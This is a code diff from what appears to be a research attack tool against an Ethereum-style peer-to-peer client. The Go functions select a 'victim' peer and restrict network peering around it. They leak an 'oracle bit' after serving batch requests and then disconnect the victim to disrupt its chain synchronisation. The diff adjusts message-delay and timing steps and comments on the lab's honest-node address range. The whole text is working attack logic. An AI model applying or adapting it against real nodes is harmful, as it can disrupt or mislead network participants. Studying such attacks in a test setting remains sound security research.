@@ -202,7 +202,6 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 	// But we must avoid changing victim during the attack.
 	if victim == nil && (victimID == "" || victimID == vID) {
 		victim = v
-		p2p.Victim = victim
 		victimID = vID
 		v.Dropped = dropped
 		v.SetMustNotifyDrop(true)
@@ -264,7 +263,12 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 			var netRestrict netutil.Netlist
 			netRestrict.Add(strings.Split(victim.RemoteAddr().String(), ":")[0] + "/32")
 			netRestrict.Add("127.0.0.1/32")
-			netRestrict.Add("3.0.0.0/8")
+			netRestrict.Add("3.0.0.0/8")				// The idea is to allow some honest nodes to connect to us,
+														// otherwise we will not have information about the honest chain,
+														// but not too many to avoid wasting time handling peering requests
+														// we don't care about. Wasting time may result in not enough time
+														// for a dropped peer to reconnect to the victim during prediction.
+														// In our testing infrastructure, honest nodes are on 3.0.0.0/8.
 			p2pserver.NetRestrict = &netRestrict
 			log("Set network restrictions:", p2pserver.NetRestrict)
 			
@@ -410,7 +414,6 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 				}
 				timeout.Stop()
 
-				p2p.DelayMessage = true
 				canServePivoting <- true 		// Only after leaking the bit, we can proceed with the disconnection
 				SendOracleBit(bit)
 				if victim == nil {
@@ -428,8 +431,6 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 												// syncOp due to the invalid header it encountered.
 				}
 				victim.Disconnect(p2p.DiscUselessPeer)
-				time.Sleep(200*time.Millisecond)
-				p2p.DelayMessage = false
 				victim = nil // Since we disconnect, the Peer object referencing the victim cannot be use any longer
 				master = false
 				servedBatches = make([]bool, numServedBatches) // Reset all values to false
